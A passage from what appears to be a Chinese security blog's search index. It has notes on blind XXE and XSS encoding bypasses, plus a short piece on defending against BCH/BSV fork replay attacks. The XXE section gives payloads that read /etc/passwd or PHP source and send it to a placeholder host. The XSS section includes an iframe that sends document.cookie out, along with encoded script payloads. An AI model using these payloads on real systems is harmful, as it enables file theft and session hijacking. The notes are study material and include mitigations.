&quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % param2 SYSTEM &quot;http://xx.xx.xx.xx/?%param1&quot;&gt;%param2;]&gt; 但由于不能在实体声明中引用参数实体，所以只能如下的引用：将嵌套实体声明放入外部实体文件(dtd/xml)payload：1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY % load SYSTEM &quot;http://xx.xx.xx.xx/xxe/xxe1.dtd&quot;&gt; %load;]&gt;xxe1.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=s.php&quot;&gt; &lt;!ENTITY % top &apos; &lt;!ENTITY &amp;#x25; send SYSTEM &quot;http://xx.xx.xx.xx/?%file;&quot;&gt; &apos;&gt;%top; %send;&gt; 可以在日志中看到： 12 &quot;GET /xxe/xxe1.dtd HTTP/1.0&quot; 200 403 &quot;-&quot; &quot;-&quot;xx.xx.xx.xx - - [28/Dec/2018:12:44:24 +0800] &quot;GET /?PD9waHAKJF8gPSAoJ2EnLidzJy4ncycuJ2UnLidyJy4oJwwnXid4JykpOwokX18gPSAkX0dFVFtfXS4nLy8nOwokX19fPSgkXy4nJyk7CigkX19fKT8kX19fKCRfXyk6JF9fXygkX18pOwo/Pg== HTTP/1.0&quot; 200 2141 &quot;-&quot; &quot;-&quot; 达到任意文件读取的目的但etc/passwd 直接读取编码后，（用get请求发送会显示读取字符串太长；初步测试长度hash后2945,但感觉这个数据有点怪异，有可能是其他原因） 此处也可以使用支持的其他协议： libxml2支持: file/http/ftp php支持：file/http/ftp/php/compress.zlib/compress.bzip2/data/glob/phar java支持: http/https/ftp/file/jar/netdoc/mailto/gopher NET支持:file/http/https/ftp 但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充XML解析器学习到这里 顺便学一下 XML解析器 XXE危害： 读取任意文件： 命令执行php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装 内网探测/SSRF 拒绝服务 XXE防御： 最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD，即禁用外部实体 12345678910PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据 1关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC 参考资料：123http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.htmlhttps://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/https://blog.csdn.net/u011721501/article/details/43775691","categories":[],"tags":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"XXE","slug":"XXE","permalink":"http://yoursite.com/tags/XXE/"}]},{"title":"编码绕过xss","slug":"xss/编码绕过XSS","date":"2018-12-01T16:00:00.000Z","updated":"2019-07-21T04:31:46.602Z","comments":true,"path":"2018/12/02/xss/编码绕过XSS/","link":"","permalink":"http://yoursite.com/2018/12/02/xss/编码绕过XSS/","excerpt":"","text":"标签img、video、audio、iframe中的src属性只能请求，不能执行，在ie8以前可以;但可以使用js伪协议调用js12345&lt;iframe src=&quot;javascript:alert(&apos;iframe&apos;)&quot; width = &quot;0&quot; height = &quot;0&quot;/&gt;&lt;iframe src=&quot;javascript:var img=document.createElement(&apos;img&apos;);img.src=&apos;http://xx.xxx.xxx.xxx/log&apos;+escape(document.cookie);document.body.appendChild(img);&quot;/&gt; Base64编码绕过一般应用场景：12&lt;a href=&quot;可控点&quot;&gt;&lt;iframe src=&quot;可控点&quot;&gt; 当在这种情况下 过滤了&lt;&gt;’ “ javascript的话 就可以尝试使用base64编码绕过 123&lt;a href=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt;&lt;img src=x onerror=alert(1)&gt; 这样当test A链接时,就会以data协议 页面以html/text的方式解析 编码为base64 然后单点击a链接时 base64的编码就被还原成原本的 HTML编码16进制/10进制 &amp;#x/&amp;html实体编码本身只是为了防止与html本身语义标记的冲突。html正常只识别html10进制、html16进制,不会在html标签中解析js的那些编码，因此在比如onerror后放置js的编码比如jsunicode、js八进制、js16进制是不会解析的。1&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; magic_quote_gpc绕过在遇到php中magic_quote_gpc（版本5.4之后已经移除了） 魔术变量处理开关转义，即便存储到后台的数据也会是转义的，如果输入的数据有单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。针对该设置，进行xss绕过的话，通常使用js的string.fromCharCode()12345678&lt;?php$a=$_GET[&apos;id&apos;];echo $a;?&gt;http://localhost:8888/ev_php/xss_gpc.php?id=%3Cscript%3Ealert(String.fromCharCode(34,%2049,%2034))%3C/script%3E&lt;script&gt;alert(String.fromCharCode(34, 49, 34))&lt;/script&gt; string.fromCharCode()： Unicode 字符值中返回一个字符串 javascript jsunicode 8进制和16进制[&lt;] 分别是 \\u003c \\74 \\x3c 宽字节绕过头部Base绕过url编码【1】浏览器在发出url前会进行一次url编码，针对部分字符，以firefox为例子： 12345发出的请求 &apos;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 服务端接收到的请求 %27%22%20%3Cscript%3Ealert(1)%3C/script%3E服务端自动解码一次返回数据（默认） &apos;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 这也是为什么提交payload的时候可以不编码、urlencode注意 浏览器的urlencode 应该是不包括%的，和常规的urlencode不太一样 双重编码在某些时候测试xss中，可能会遇到payload中被htmlspecialcahrs编码，但可以针对服务端进行双重编码绕过，推测该后端代码1234&lt;?php$a=htmlspecialchars($_GET['id']);echo urldecode($a);?&gt; 在该url中经过htmlspecialchars处理后，又再次进行了urldecode，相当于进行了两次urldecode，又因为经过编码绕过了htmlspecialchars的处理，故触发了该xss 三重编码和双重绕过类似，推测多出来的一次是因为在htmlspecialchars前又进行了一次编码，如果没有后面那一行”echo urldecode($a);” 过滤是正常的，两者问题都出在此处12345&lt;?php$a=$_GET['id'];$a1=htmlspecialchars($a);echo urldecode($a1);?&gt; 浏览器编码解码原理为了更深入的了解xss的结果和原理，不得不了解浏览器的工作原理，以及解码顺序。浏览器中具有URL解析引擎、HTML解析引擎、JS解析引擎主要构成： 用户界面 浏览器引擎－ 用来查询及操作渲染引擎的接口 渲染引擎－ 用来显示请求的内容，例如，如果请求内容为html，它负责解析html及css，并将解析后的结果显示出来 网络－ 用来完成网络调用，例如http请求，它具有平台无关的接口，可以在不同平台上工作 UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口 JS解释器－ 用来解释执行JS代码 数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据，HTML5定义了web database技术，这是一种轻量级完整的客户端存储技术 重点是接下来的编码解码顺序首先是URL解析: 用户在浏览器中填写一个资源定位标识，浏览器在将内容发送给对应的服务器，服务器对浏览器发过来的请求信息进行URL解析，在这个过程中遇到%号时会对该url进行url解码，该解码位置在于服务端自动解码一次，不需要编写代码，浏览器自身是不会进行url解码的案例： 在客户端提交一次经过urlencode的字符串，在接收到服务端的返回数据时，已经经过urldecode了，而服务端如果直接返回urlencode的数据，浏览器接收到仍然用urlencode的形式渲染，在xss中并不会起作用,测试代码如下，有点乱 小尴尬：12345&lt;?phpecho $a1=$_GET[&apos;id&apos;];echo &quot;1&lt;/br&gt;&quot;;echo $a2 =&quot;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&quot;;?&gt; 在测试中a2的xss仍然以urlencode的形式返回到浏览器而不会解析，而以get方式提交的id，以urlencode形式提交则会解析触发xss HTMl/SVG/XHTML 解析浏览器在接收到页面数据时，会首先对该数据进行HTML解析来构造DOM树，构造的过程与语言的编译过程是相似的，接收文档，先进行词法分析，然后语法分析，构建解析树。HTML 的分析器只能识别特定的词法规则，才能构建起DOM 树，这一块，HTML 不会做解码的工作因此以下代码无效：即标签本身结构不能变化1&lt;img src&amp;#x3d;&quot;http://xxx.xxx.xx.xxx&quot;&gt; 在DOM构建完成后，才开始识别节点内容对html实体编码的内容进行解码 构造DOM树解析树是由DOM元素和属性节点构成的树结构，根节点是Document对象，DOM与标记一一对应1234567891011&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt; &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;/p&gt;&lt;h1&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 对应的DOM树：123456789graph TDst(HTMLDocument)--&gt;aa(HTML)a--&gt;b1(head)a--&gt;b2(body)b1--&gt;c1(meta)b1--&gt;c2(title)b2--&gt;p1(p)b2--&gt;p2(h) 解析过程是迭代的，解析器从词法分析器处取到一个新的符号，并试着用这个符号匹配一条语法规则，如果匹配了一条规则，这个符号对应的节点将被添加到解析树上，然后解析器请求另一个符号。如果没有匹配到规则，解析器将在内部保存该符号，并从词法分析器取下一个符号，直到所有内部保存的符号能够匹配一项语法规则。如果最终没有找到匹配的规则，解析器将抛出一个异常，这意味着文档无效或是包含语法错误。 123如：&lt;img11 src=1 onerror=&apos;a(1)&apos;&gt;在浏览器解析时会报错：HTML 文档的字符编码未声明。如果该文件包含 US-ASCII 范围之外的字符，该文件将在某些浏览器配置中呈现为乱码。页面的字符编码必须在文档或传输协议层声明。 untitled.html 而最后输出的树，也就是这里的解析树，是由DOM元素及属性节点组成的DOM树构建完毕后 html编码就会被解析，html解析中无法用常规的自下而上或自上而下的解析器进行解析原因在于： 语言的宽容本质 浏览器历来对一些常见的无效html用法采取包容态度 解析过程需要不断地重复，源内容在解析过程中通常不会改变，但是在 HTML 中，脚本标记如果包含 document.write，就会添加额外的标记，这样解析过程实际上就更改了输入内容，浏览器创建了自定义的解释器来解析HTML html解释器算法 标记化和树构建标记化是词法分析过程、将输入内容解析成多个标记构建解析流程图如下：1234567graph TDst[network]--&gt;a1a1[tokeniser]--&gt;a2a2&#123;tree construction&#125;--&gt;a3[DOM]a2&#123;tree construction&#125;--&gt;a4[ScriptExecution]a4[ScriptExecution]--&gt;a1a3--&gt;a4 标记生成器识别标记，传递给树构造器，然后接受下一个字符以识别下一个标记；如此反复直到输入的结束 js解释器在处理如“script、style”这样的标签，解释器会切换到特殊解析模式，在src href 后边加入的JavaScript 等的html解码后，进入js的解析模式，进入该模式后，该DOM节点已经建立起了。 所以先进行jsunincode编码再进行html编码可以正常触发1&lt;a href=&quot;javascript:alert&amp;#40;&amp;#39;&amp;#60;&amp;#92;&amp;#117;&amp;#52;&amp;#101;&amp;#48;&amp;#48;&amp;#62;&amp;#39;&amp;#41;&quot;&gt;test&lt;/a&gt; 在测试中 先进行html实体编码，再进行js16进制转码，不会正常解码1源码:&lt;a href=&quot;javascript:alert(&apos;test&apos;)&quot;&gt;test&lt;/a&gt; 测试输出为unicode编码：1234先html:&lt;a href=&quot;javascript:alert(&apos;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&apos;)&quot;&gt;test&lt;/a&gt;再js16进制：&lt;a href=&quot;javascript:alert(&apos;\\x26\\x23\\x31\\x31\\x36\\x3b\\x26\\x23\\x31\\x30\\x31\\x3b\\x26\\x23\\x31\\x31\\x35\\x3b\\x26\\x23\\x31\\x31\\x36;&apos;)&quot;&gt;test&lt;/a&gt; 正常输出：test1&lt;a href=&quot;javascript:alert(&apos;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&apos;)&quot;&gt;test&lt;/a&gt; 1234先js 16进制:&lt;a href=&quot;javascript:alert(&apos;\\x74\\x65\\x73\\x74&apos;)&quot;&gt;test&lt;/a&gt;再html编码：&lt;a href=&quot;javascript:alert(&apos;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&apos;)&quot;&gt;test&lt;/a&gt; 先进行html编码再进行unicode编码 解析失败1&lt;a href=&quot;javascript:\\u0026\\u0023\\u0039\\u0037\\u003b\\u0026\\u0023\\u0031\\u0030\\u0038\\u003b\\u0026\\u0023\\u0031\\u0030\\u0031\\u003b\\u0026\\u0023\\u0031\\u0031\\u0034\\u003b\\u0026\\u0023\\u0031\\u0031\\u0036\\u003b(&apos;1111&apos;)&quot;&gt;test&lt;/a&gt; 先进行unicode编码再进行html编码解析成功1&lt;a href=&quot;javascript:&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;(&apos;1111&apos;)&quot;&gt;test&lt;/a&gt; 综上 浏览器对于编码解码的顺序 url解码-html解码-js解码 tips:经测试 js16进制/8进制只会在js 字符串中解析，如果作为变量名、触发事件则不会解析如： 思考：&lt;&lt;白帽子讲Web安全&gt;&gt;1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; var x2=\\x61\\x6c\\x65rt(1); var x1=&quot; &apos;onclick=alert(1);//&apos;&quot; var x=&quot;\\x20\\x27onclick\\x3dalert\\x281\\x29\\x3b\\x2f\\x2f\\27&quot;; document.write(&quot;&lt;a href=&apos;&quot;+x1+&quot;&apos;&gt;test&lt;a&gt;&quot;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 可以用以下例子来尝试看一下弹窗顺序1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=1 onerror=&apos;a(1)&apos;&gt;&lt;script type=&quot;text/javascript&quot;&gt; a(2);&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; function a(c)&#123; alert(c); &#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; a(3);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 参考 0x_Jin 凯神的《XSS与字符编码那些事儿》 案例xss中禁用了&amp;#符号实体编码是由&amp;#组成的，这个时候只能考虑能不能通过url编码绕过&amp;#，再让浏览器解码成 &amp;# 然后拼接x27 最后就成为了单引号的html16进制编码来绕过借用凯神的案例1&lt;a href=&quot;javascript:location=&apos;./3.3.php?offset=&apos;+document.getElementById(&apos;pagenum&apos;).value+&apos;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=&apos;&quot;&gt;GO&lt;/a&gt; 提交的payload：1wooyun%26%23x27,alert(1)%2b%26%23x27 解码后1&apos;,alert(1)&apos; 感谢在@星尘的指导下，从新捋了捋xss编码的问题，现阶段就暂时到这吧。还是沉淀不够。革命尚未成功，同志尚需努力啊 by @流云 在线工具在线编码解码工具：https://www.mokuge.com/tool/unicode/ 参考 https://www.cesafe.com/5075.html http://su.xmd5.org/static/drops/tips-689.html 宽字节： http://book.2cto.com/201301/14515.html http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss http://www.wooyun.org/bugs/wooyun-2010-015969 https://blog.csdn.net/u013648937/article/details/46629827","categories":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/categories/Web渗透/"},{"name":"常规渗透","slug":"Web渗透/常规渗透","permalink":"http://yoursite.com/categories/Web渗透/常规渗透/"},{"name":"XSS","slug":"Web渗透/常规渗透/XSS","permalink":"http://yoursite.com/categories/Web渗透/常规渗透/XSS/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"},{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"常规渗透","slug":"常规渗透","permalink":"http://yoursite.com/tags/常规渗透/"}]},{"title":"BCH分叉-重放攻击解决方案","slug":"BCH分叉","date":"2018-07-22T18:11:33.000Z","updated":"2019-07-21T04:31:46.764Z","comments":true,"path":"2018/07/23/BCH分叉/","link":"","permalink":"http://yoursite.com/2018/07/23/BCH分叉/","excerpt":"","text":"BCH分叉 重放攻击解决方案BCH在进行硬分叉：分为BCH和BCHSV 对于分叉前拥有BCH的用户，在分叉后该钱包中会拥有BCH/BSV两种虚拟货币，若是分叉前钱包里有BCH，在硬分叉完成后，这个钱包里也会生成相应的BSV 目的：分离同一地址中 共同存在的BCH和BSV 来防重放攻击针对转账业务限制条件：该用户账户拥有BCH的同时也拥有BSV利用原理：在用户原意在分叉后转帐 BCH 时，该消息被攻击者广播在BSV链上，导致用户的BSV资产也被转移，受到重放攻击。 INPUT污染法分离：INPUT污染法的原理：就是用分叉后的BCH混入分叉前的BCH，从而达到分离BCH与BSV的目的。具体操作如下： 在分叉完成后，用分叉后的BCH币充值到分叉前的BCH币所在的钱包，然后将这个钱包里所有的BCH币（分叉前的BCH和分叉后的BCH）转移到另一个地址。此次交易在BCH链可以成功完成，但是在BSV链上广播时却不能被节点接受，因为这笔交易离存在着分叉后的BCH币。这样子，BSV还是存在于原本的钱包中，达到了将BCH和BSV分离的目的。 构造特有的操作码交易：分叉后的BCH和BSV链的共识机制有一定的区别，主要体现在操作码上， BCH链上交易时，构造含有 OP_CHECKDATASIG 操作码的输出 BCHSV链上交易时，构造含有 OP_MUL 操作码的输出","categories":[{"name":"区块链安全","slug":"区块链安全","permalink":"http://yoursite.com/categories/区块链安全/"}],"tags":[{"name":"区块链安全","slug":"区块链安全","permalink":"http://yoursite.com/tags/区块链安全/"}]}]}